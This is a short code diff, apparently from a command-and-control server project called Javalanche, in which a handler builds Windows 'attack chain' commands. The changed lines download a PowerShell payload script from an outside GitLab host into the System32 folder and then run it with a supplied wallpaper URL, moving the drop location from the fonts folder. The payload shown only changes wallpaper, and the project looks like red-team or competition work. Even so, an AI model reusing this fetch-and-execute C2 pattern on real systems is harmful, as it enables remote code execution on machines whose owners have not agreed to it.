@@ -654,8 +654,8 @@ public class C2ServerUserHandler implements Runnable{
                     
                     // Windows
                     windowsCommands = "";
-                    windowsCommands += "wget -o C:\\Windows\\fonts\\wallpaper.ps1 https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsAttackChainScripts/changeWallpaper.ps1?ref_type=heads";
-                    windowsCommands += "& 'C:\\Windows\\fonts\\wallpaper.ps1 -wallpaperURL " + photoURL;
+                    windowsCommands += "wget -o C:\\Windows\\System32\\wallpaper.ps1 https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsAttackChainScripts/changeWallpaper.ps1?ref_type=heads";
+                    windowsCommands += "& 'C:\\Windows\\System32\\wallpaper.ps1 -wallpaperURL " + photoURL;
 
 
                 }else if (userAttackChainChoice.equals("6")){
